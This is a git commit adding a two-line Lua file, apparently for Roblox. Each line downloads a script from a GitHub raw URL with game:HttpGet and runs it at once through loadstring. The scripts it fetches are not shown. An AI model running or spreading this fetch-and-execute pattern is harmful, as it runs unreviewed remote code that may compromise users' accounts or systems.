ac8e6575bf889973ea35a07d3c46281c3f09fed0
momotarou <deadblueviolets@gmail.com>
2025-05-21 13:52:23 -0500

    Update and rename test.lua to redirect.lua

---
+++ redirect.lua
@@ -0,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kawatsukimi/jazmine/refs/heads/main/pink.lua"))(Key)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kawatsukimi/jazmine/refs/heads/main/blue.lua"))()
